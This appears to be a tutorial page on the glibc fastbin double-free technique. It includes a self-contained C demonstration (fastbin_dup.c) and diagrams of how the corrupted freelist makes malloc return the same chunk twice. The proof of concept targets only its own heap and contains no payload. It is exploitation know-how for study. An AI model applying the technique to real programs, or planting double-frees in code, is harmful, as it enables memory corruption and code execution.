#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "glibc Allocator: Fastbin Double-Free",
    description: "Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.",
    date: "2025-12-13",
    order: 19,
  ),
)<frontmatter>

= glibc Allocator: Fastbin Double-Free Attack

== Introduction

This document demonstrates a double-free attack that abuses the fastbin freelist in the glibc allocator. By freeing the same chunk twice, we can corrupt the freelist and trick `malloc` into returning a pointer to an already-allocated chunk. This can lead to a write-what-where condition and potentially arbitrary code execution.

The example code is from `fastbin_dup.c`.

== Example from `fastbin_dup.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple double-free attack with fastbins.\n");

	printf("Allocate buffers to fill up tcache and prep fastbin.\n");
	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("Allocating 3 buffers.\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);
	printf("1st malloc(8): %p\n", a);
	printf("2nd malloc(8): %p\n", b);
	printf("3rd malloc(8): %p\n", c);

	printf("Fill up tcache.\n");
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("Freeing the first chunk %p...\n", a);
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	/* VULNERABILITY */
	free(a);
	/* VULNERABILITY */

	printf("In order to use the free list for allocation, we'll need to empty the tcache.\n");
	printf("This is because since glibc-2.41, we can only reach fastbin by exhausting tcache first.");
	printf("Because of this patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=226e3b0a413673c0d6691a0ae6dd001fe05d21cd");
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	puts("Note that since glibc 2.41, malloc and calloc behave the same in terms of the usage of tcache and fastbin, so it doesn't matter whether we use malloc or calloc here.");
	a = malloc(8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1st malloc(8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	assert(a == c);
}
```

== Attack Flow Explained

The attack proceeds in the following steps, which we'll visualize. We assume `malloc(8)` allocates a chunk of size `0x20` on a 64-bit system.

=== 1. Initial State & T-Cache Fill

First, three buffers `a`, `b`, and `c` are allocated. Then, to ensure subsequent frees go into the fastbin, we fill the t-cache for the `0x20` size by allocating and freeing 7 temporary chunks.

```c
int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);
// ...
for (int i=0; i<7; i++) {
    free(ptrs[i]);
}
```

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Address*], [*Size*], [*Status*],
    [Let's assume `a` is at `0x1000`], `0x20`, [*Allocated*],
    [Let's assume `b` is at `0x1020`], `0x20`, [*Allocated*],
    [Let's assume `c` is at `0x1040`], `0x20`, [*Allocated*],
  ),
  caption: [Initial memory state after allocating a, b, and c.],
)

At this point, the t-cache for size `0x20` is full.

=== 2. The Double-Free

The core of the vulnerability is freeing a chunk twice to corrupt the fastbin freelist. A simple `free(a); free(a);` would be caught by glibc's double-free check. To bypass this, we interleave another free:

```c
free(a);
free(b);
/* VULNERABILITY */
free(a);
/* VULNERABILITY */
```

1.  After `free(a)`, the fastbin freelist for size `0x20` is: `HEAD -> [ a ] -> NULL`
2.  After `free(b)`, it becomes: `HEAD -> [ b ] -> [ a ] -> NULL`
3.  After `free(a)` again, the check is bypassed because `a` is not the head of the list. The list becomes corrupted.

#figure(
  table(
    columns: (auto),
    inset: 10pt,
    align: center,
    [*Corrupted Fastbin Freelist (size 0x20)*],
    [HEAD -> `a` (`0x1000`)],
    [FD -> `b` (`0x1020`)],
    [FD -> `a` (`0x1000`)],
    [FD -> ... (original content of a's FD)],
  ),
  caption: [The fastbin freelist after the double-free. It now contains `a` twice.],
)

The freelist effectively looks like `[ a, b, a ]`.

=== 3. Allocation leads to Duplication

Now, we need to allocate from the corrupted fastbin. First, the code empties the t-cache by allocating 7 chunks.

```c
for (int i = 0; i < 7; i++) {
    ptrs[i] = malloc(8);
}
```

With the t-cache exhausted, the next three allocations will be served from our corrupted fastbin:

```c
a = malloc(8);
b = calloc(1, 8);
c = calloc(1, 8);
```

1.  The first allocation (`a = malloc(8)`) returns the chunk at `0x1000`. The fastbin list becomes `[ b, a ]`.
2.  The second allocation (`b = calloc(1, 8)`) returns the chunk at `0x1020`. The fastbin list becomes `[ a ]`.
3.  The third allocation (`c = calloc(1, 8)`) returns the chunk at `0x1000` *again*.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Variable*], [*Points To*], [*Status*], [*Note*],
    [`a` (new)], `0x1000`, [*Allocated*], [First allocation],
    [`b` (new)], `0x1020`, [*Allocated*], [Second allocation],
    [`c` (new)], `0x1000`, [*Allocated*], [Third allocation, points to same memory as `a`!],
  ),
  caption: [Final state: two pointers, `a` and `c`, point to the same chunk.],
)

The `assert(a == c)` at the end of the program confirms the success of the attack.

== Security Implications

This vulnerability allows an attacker to gain control over an allocated chunk. If the first user of the chunk (the code using pointer `a`) writes data, the second user (pointer `c`) can overwrite that data with malicious content, or vice-versa. This can lead to a variety of consequences, including data corruption, crashes, and, in more advanced exploits, control over the instruction pointer, leading to arbitrary code execution.
